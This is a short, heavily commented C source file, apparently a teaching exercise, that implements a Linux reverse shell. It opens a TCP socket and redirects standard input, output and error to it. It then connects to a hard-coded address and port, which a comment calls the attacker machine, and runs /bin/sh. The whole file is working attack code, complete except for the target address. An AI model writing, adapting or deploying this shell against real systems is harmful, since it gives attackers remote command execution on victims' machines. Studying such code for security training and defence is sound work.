// Author :  Alessio Parzian
// Filename: rev_shell.c

// Compile with:
//     gcc rev_shell.c -o rev_shell

#include <sys/socket.h>
#include <arpa/inet.h> 
#include <unistd.h>

int main()
{

	// Define address to connect and port
	char* ip = "127.0.0.1";
	int port = 1234;

	//Create the socket (man socket)
	// AF_INET for IPv4
	// SOCK_STREAM for TCP connection
	// 0 leaves it up to the service provider for protocol, which will be TCP
	int host_sock = socket(AF_INET, SOCK_STREAM, 0);

	// Redirect stdin, stdout, stderr to the socket fd created
	dup2(host_sock, 0);
	dup2(host_sock, 1);
	dup2(host_sock, 2);

	// Create sockaddr_in struct (man 7 ip)
	struct sockaddr_in host_addr;

	// AF_INET for IPv4
	host_addr.sin_family = AF_INET;
	
	// Set port number to 1234, set to network byte order by htons
	host_addr.sin_port = htons(port);

	// Convert ip from text to binary and fill the related struct
	inet_pton(AF_INET, ip, &host_addr.sin_addr);

	// Connect to attacker machine
	connect(host_sock, (struct sockaddr *) &host_addr, sizeof(host_addr));

	// Execute bash
	execve("/bin/sh", NULL, NULL);

}